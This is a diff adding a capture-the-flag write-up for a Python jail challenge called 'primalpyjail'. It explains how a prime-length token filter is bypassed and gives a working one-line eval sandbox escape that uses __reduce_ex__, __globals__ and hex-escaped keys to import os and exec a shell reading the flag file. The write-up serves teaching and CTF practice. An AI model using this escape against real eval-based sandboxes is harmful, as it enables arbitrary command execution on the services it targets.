@@ -242,3 +242,79 @@ From my session:
 ```
 jail{but_does_your_desk_calculator_have_rce?_5c9cff7b71fc447d}
 ```
+
+_______
+
+# Challenge: primalpyjail
+
+**Category:** misc / pyjail
+**Author:** @oh_word
+**Points:** 1337
+
+## Problem
+
+A Python service reads one line and evaluates it with `eval(code, {'__builtins__': {}})`. Before evaluating, it enforces three filters:
+
+1. If `len(code) > 200`, or non-ASCII is present, or the substring **`eta`** appears anywhere ⇒ prints **“Relax”** and exits.
+2. It regex-scans the **raw source** with `r"\w+"` and requires **every** word token length to be **prime**. If any token has a non-prime length ⇒ prints **“Nope”** and exits.
+3. On pass, `eval` runs with an empty `__builtins__`.
+
+Flag is stored in the same directory as the instance.
+
+## Key insights
+
+* **Prime-token rule hits strings too.** The regex walks the source, so `"flag"` contributes a 4-letter token (not prime) and `'-c'` contributes the one-letter token `c` (not prime).
+* **Digits are banned implicitly.** Writing `0` or `1` creates 1-char tokens (not prime).
+* **`getattr`/`__getattribute__` are blocked** (either contain `eta` or have non-prime length).
+* We can still reach a **real Python function** via `().__reduce_ex__(2)[0]` (the first element is `copyreg.__newobj__`), then take its `__globals__` to recover `__builtins__` and thus `__import__`.
+* All dangerous identifiers with non-prime lengths (e.g., `__builtins__`, `__import__`) can be accessed by using **hex-escaped string keys**, so the only visible tokens are like `x5f` (length 3, prime).
+* Use booleans and `. __len__()` to avoid digit literals and keep under **200 chars**.
+
+## Exploit
+
+Build a one-liner that:
+
+1. Grabs a Python function from `reduce_ex`
+2. Walks to its `__globals__`
+3. Indexes `__builtins__` and then `__import__` using hex keys
+4. Imports `os` and **execs** `sh -c 'cat *f*'`
+5. Hex-escape `-c` and the letter `f` inside the command string to satisfy the prime-token filter
+
+### Final payload
+
+```python
+().__reduce_ex__('aa'.__len__())[False].__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').execl('/bin/sh','sh','\x2d\x63','cat *\x66*')
+```
+
+**Why it passes the filters**
+
+* Longest risky names (`__builtins__`, `__import__`) are accessed via **hex-escaped keys**, so the regex only sees `xNN` tokens (length 3, prime).
+* `False` indexes element 0 of the reduce tuple (avoids the digit `0`).
+* The protocol `2` is produced as `'aa'.__len__()` (prime-length tokens only).
+* `-c` is `'\x2d\x63'`, and the `f` in `*f*` is `\x66`, so no 1-letter tokens.
+* Entire input is ASCII and < 200 chars.
+
+<img width="1091" height="102" alt="image" src="https://github.com/user-attachments/assets/b8352882-930b-4752-a153-6746b06c3af3" />
+
+
+## Notes / sanity checks (helped during exploitation)
+
+* **Eval is live:**
+  `('\x61'.__len__()/('\x61'.__len__()-'\x61'.__len__()))` → `ZeroDivisionError`
+* **“Relax” test:**
+  `'beta'` → `Relax` (literal `eta` in source)
+* **“Nope” tests:**
+  `'a'` → `Nope` (1-char word token)
+  `'-c'` → `Nope` (token `c`)
+  `'\x2d\x63'` → OK (only `x2d`, `x63` seen)
+
+## Takeaways
+
+* Regexing the **raw source** for tokens makes string contents part of the policy surface.
+* Removing builtins isn’t enough when there’s any reachable route to a Python **function object**: `.__globals__` is a powerful pivot.
+* Small “linguistic” constraints (prime token lengths, banned substrings) can be sidestepped systematically with **hex escapes**, boolean indexing, and dunder gadgetry.
+
+**Flag:** `jail{it_was_prbably_schizophrenia_fad4cea2cfe8}` 
+
+_____
+
